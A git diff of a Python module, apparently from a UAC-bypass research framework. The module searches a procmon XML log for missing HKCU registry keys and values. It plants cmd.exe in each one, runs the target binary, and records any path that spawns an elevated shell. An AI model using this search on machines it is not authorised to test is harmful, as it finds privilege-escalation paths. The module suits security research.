@@ -13,58 +13,77 @@ class CustomModule(Module):
                        "Author": "Santiago Hernandez Ramos"}
 
         # -----------name-----default_value--description
-        options = {"binary": [None, "Target of the UAC fileless bypass search"],
-                   "xml_file": [None, "Path to a procmon like XML file"]}
+        options = {"binary": [None, "Target of the UAC fileless bypass search", False],
+                   "xml_file": [None, "Path to a procmon like XML file", True]}
 
         # Constructor of the parent class
         super(CustomModule, self).__init__(information, options)
 
         # Class atributes, initialization in the run_module method
         # after the user has set the values
-        self._xml = None
-        self._binary = None
         self._results = []
         self.p = None
         self.events = None
         self.events_nf = None
+        self.reg = None
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        # To access user provided attributes, use self.options dictionary
-        self._xml = self.options["xml_file"][0]
-        self._binary = self.options["binary"][0]
 
-        self.p = Xml_parser()
-        # Initializating the options of the module
-        self.p.parse_tree(self._xml)
-
-        r = Registry()
+        self.init_import_modules()
 
         self.events = self.p.events()
         self.events_nf = self.p.events_notfound(self.events)
-        openkey_nf = self.events_nf_openkey(proc=self._binary)
-        queryvalue_nf = self.events_nf_queryvalue(proc=self._binary)
+        openkey_nf = self.events_nf_openkey()
+        queryvalue_nf = self.events_nf_queryvalue()
 
-        print "[*] Searching for openkey not found values"
-        for p in self.get_paths_byword(openkey_nf, None):
+        # print "[*] Searching for openkey not found values"
+        # for p in self.get_paths_byword(openkey_nf, None):
+        #     print "[*] Inserting into %s" % str(p)
+        #     k = self.reg.create_key(HKCU, "\\".join(p.split("\\")[1:]))
+        #     self.reg.set_value(HKCU, "\\".join(
+        #         p.split("\\")[1:]), "C:\\Windows\\System32\\cmd.exe")
+
+        #     previous_pid = psutil.pids()
+        #     self.execute(self.args["binary"])
+        #     new_pid = psutil.pids()
+
+        #     if self.is_cmd_open():
+        #         self._results.append(str(p))
+        #         self.kill('cmd')
+        #     else:
+        #         self.kill(self.args["binary"].split(
+        #             '.')[0], previous_pid, new_pid)
+
+        #     self.reg.restore(k)
+
+        #########################################################
+        print "[*] Searching for queryvalue not found values"
+        for p in self.get_paths_byword(queryvalue_nf, None):
             print "[*] Inserting into %s" % str(p)
-            k = r.create_key(HKCU, "\\".join(p.split("\\")[1:]))
-            r.set_value(HKCU, "\\".join(
-                p.split("\\")[1:]), "C:\\Windows\\System32\\cmd.exe")
+            k = self.reg.create_key(HKCU, "\\".join(p.split("\\")[1:-1]))
+            self.reg.create_value(k, p.split(
+                "\\")[-1], "C:\\Windows\\System32\\cmd.exe")
 
             previous_pid = psutil.pids()
-            self.execute(self._binary)
+            self.execute(self.args["binary"])
             new_pid = psutil.pids()
 
             if self.is_cmd_open():
                 self._results.append(str(p))
                 self.kill('cmd')
             else:
-                self.kill(self._binary.split('.')[0], previous_pid, new_pid)
+                self.kill(self.args["binary"].split(
+                    '.')[0], previous_pid, new_pid)
 
-            r.restore(k)
+            self.reg.restore(k)
 
         self.results()
+
+    def init_import_modules(self):
+        self.p = Xml_parser()
+        self.p.parse_tree(self.args["xml_file"])
+        self.reg = Registry()
 
     def results(self):
         for r in self._results:
@@ -101,11 +120,11 @@ class CustomModule(Module):
         except:
             pass
 
-    def events_nf_openkey(self, proc=None):
+    def events_nf_openkey(self):
         events_nf_hkcu = self.p.events_word("HKCU", self.events_nf)
         return self.p.events_operation("RegOpenKey", events_nf_hkcu)
 
-    def events_nf_queryvalue(self, proc=None):
+    def events_nf_queryvalue(self):
         events_nf_hkcu = self.p.events_word("HKCU", self.events_nf)
         return self.p.events_operation("RegQueryValue", events_nf_hkcu)
 
